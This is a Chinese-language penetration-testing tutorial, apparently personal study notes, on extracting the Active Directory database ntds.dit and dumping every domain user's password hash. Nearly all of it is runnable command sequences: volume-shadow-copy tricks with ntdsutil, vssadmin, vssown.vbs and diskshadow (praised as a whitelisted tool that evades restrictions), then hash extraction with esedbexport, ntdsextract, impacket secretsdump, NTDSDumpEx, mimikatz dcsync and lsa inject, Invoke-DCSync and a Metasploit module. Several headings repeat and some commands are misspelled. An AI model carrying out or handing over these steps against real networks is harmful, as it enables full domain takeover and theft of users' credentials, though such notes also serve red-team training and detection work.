# 介绍ntd
ntds.dit是主要的AD数据库，存放在c:\\windows\\NTDS\\NTDS.dit，包括有关域 用户，组和成员身份的信息，它还包括域中所有用户的密码哈希值，为了进一步保 护哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。 因为这两个文件属于系统特殊文件，不能直接复制粘贴，所以需要用特殊的方式来 复制粘贴。

# 为什么要使用卷影拷贝
在通常情况下，即使拥有管理员权限，也无法读取域控制器中的 C:\\Windows\\NTDS\\ntds.dit文件（活动目录始终访问这个文件，所以文件被禁止读取 当c盘处于非活动目录 就可以访问 附：pe原理）使用windows本地卷影拷贝服务，就可以获得文件的副本

# 使用卷影拷贝服务提取ntds.dit

## ntdsutil
ntdsutil概述：
Ntdsutil.exe是一个为Active Directory提供管理设施的命令行工具。可使用ntdsutil.exe执行Active Directory的数据库维护，管理和控制的单机操作，创建应用程序目录分区，以及删除由未使用Active Directory安装向导（DCPromo.exe）成功降级的域控制器留下的元数据，该域控制器上操作。
支持的系统为：server2003、server2008、server2012

a)通过ntdsutil.exe提取ntds.dit
创建快照：
Ntdsutil snapshot “activate instance ntds” create quit quit
挂载快照
ntdsutil snapshot “mount {GUID}” quit quit
拷贝快照：
copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit
卸载并删除快照
Ntdsutil snapshot “unmount {GUID}” “delete {GUID}” q q
查看快照：
ntdsutil snapshot “List All” q q

b) 利用vssadmin提取ntds.dit
创建c盘卷影拷贝：
vssadmin create shadow /for=c:
在创建的卷影拷贝中将ntds.dit复制出来
copy 
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit 
c:\ntds.dit
卸载并删除卷影
vssadmin delete shadows /for=c: /quiet

c) 通过vssown.vbs提取ntds.dit
启动卷影拷贝服务：
cscript vssown.vbs /start
创建c盘卷影拷贝：
cscript vssown.vbs /create c
列出卷影拷贝
cscript vssown.vbs /list
在创建的卷影拷贝中将ntds.dit复制出来
copy 
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit 
c:\ntds1.dit
删除卷影
cscript vssown.vbs /delete {ID}

d)使用ntdsutil的IFM创建卷影拷贝
ntdsutil “ac i ntds” “ifm” “create full C:\ntdsutil” quit quit
最终会在C:\ntdsutil找到utds.dit和system.hive
C:\ntdsutil\registry\system —→system.hive
C:\ntdsutil\C:\ntdsutil\Active Directory\ntds.dit

e) 使用diskshadow导出ntds.dit
Diskshadow这款工具的代码是微软官方签名的，server2008-2016都默认包含diskshadow，且为白名单程序，它可以使用卷影拷贝服务所提供的多个功能，
Diskshadow有交互和非交互两种模式，在使用交互模式时，需要登录远程桌面的图形化管理页面，无论是交互模式还是非交互模式，都可以使用exec调取一个脚本
文件来执行相关命令，但在实战中，一般使用非交互模式来执行命令，可以绕过很多限制。
比如让其执行文件里面的命令:
Echo exec c:\windows\system32\calc.exe > c:\11.txt
Diskshadow /s c:\11.txt

e) 使用diskshadow导出ntds.dit
将如下命令写到一个11.txt文件中
set context persistent nowriters //设置卷影拷贝
add volume c: alias someAlias //添加卷
create //创建卷
expose %someAlias% k: //分配虚拟磁盘盘符
exec “c:\windows\system32\cmd.exe” /c copy k:\windows\NTDS\ntds.dit c:\ntds.dit 
//将ntds.dit复制到c盘
delete shadows all //删除快照
list shadows all //列出卷影拷贝
reset //重置
exit //退出

e) 使用diskshadow导出ntds.dit 这里shell路径必须切换到c:\windows\system32
然后将如上文件传到目标机，然后调用执行文件中的命令
Diskshadow /s c:\11.txt

8. 监控卷影拷贝服务的使用情况

# 导出NTDS.DIT中的散列值

1. 使用esedbexport恢复ntds.dit

1.1使用esedbexport恢复ntds.dit
安装libesedb
Wget https://github.com/libyal/libesedb/releases/download/20210424/libesedbexperimental-20210424.tar.gz
apt-get install autoconf automake autopoint libtool pkg-config
./configure
Make
Make install
Idconfig
然后再kali里面
esedbexport –m tables ntds.dit
然后将ntds.dit.export文件夹和system文件复制到ntdsextract中解析出信息


1.2 使用ntdsextract导出散列值。
下载后，安装：
python3 setup.py build && python3 setup.py install
导出用户名及散列值：
dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 output --syshive
SYSTEM –passwordhashes –pwdformat ocl –ntoutfile ntout --lmoutfile lmout |tee 
all_user.txt
导出所有域信息：
dscomputer.py ntds.dit.export/datatable.4 computer_ouput –csvoutfile
all_computers.csv

2. 使用impactet工具包导出散列值

下载连接： https://github.com/SecureAuthCorp/impacket
上传到kali并安装：
python setup.py install
导出散列值命令：
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL

3. 在windows下解析ntds.dit并导出域账号和域散列值

下载地址：
https://github.com/zcgonvh/NTDSDumpEx/releases/download/v0.3/NTDSDumpE
x.zip
使用NTDSDumpex.exe可以进行导出散列值的操作， 将程序上传到目标主机，然
后将导出ntds.dit和system.hive放到一起，让后用程序进行导出散列值。
命令如下：
NTDSDumpex.exe –d ntds.dit –s system.hive –o hash.txt

# 利用dcsync获取域散列值
1，使用mimikatz转储域散列值
以管理员权限打开命令行环境，运行mimikatz输入以下命令：
lsadump::dcsync /domain:tys1.com /all /csv 导出所有用户名及散列值
lsadump::dcsync /domain:tys1.com /user:administrator /csv
也可以直接在域控制器中运行mimikatz，通过转储lsass.exe进程堆散列值进行
dump操作，命令如下：
privilege::debug
lsadump::lsa /inject
如果用户数量过多，可以先执行log命令（这样就会在mimikatz目录下生成一个文
本文档，用于记录mimikatz的所有执行结果。
2，使用dcsync获取域账号和域散列值
Invoke-DCSync.ps1 可以利用dcsync直接读取ntds.dit，以获取域账号和域散列值
命令为：
invlke-DCSync –PWDumpFormat
该参数用于对输出内容进行格式化。
Invoke-DCSync -DumpForest | ft -wrap –autosize 导出所有用户hash
导出administrator用户hash：
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize

# 使用metasploit获取域散列值

使用metasploit获取域散列值
在kali中进入MSF环境，输入以下命令，来使用pscexec_ntdsgrab模块
use auxiliart/admin/smb/psexec_ntdsgrab
show options
配置参数：RHOST、SMBDomain、SMBUser、SMBpass
配置好以后，执行exploit命令即可获取ntds文件
执行成功后,ntds.dit会存储到/root/.msf4/loot/文件夹下面

# 使用vshadow.exe和quarkspwdump.exe导出域账号提取域散列值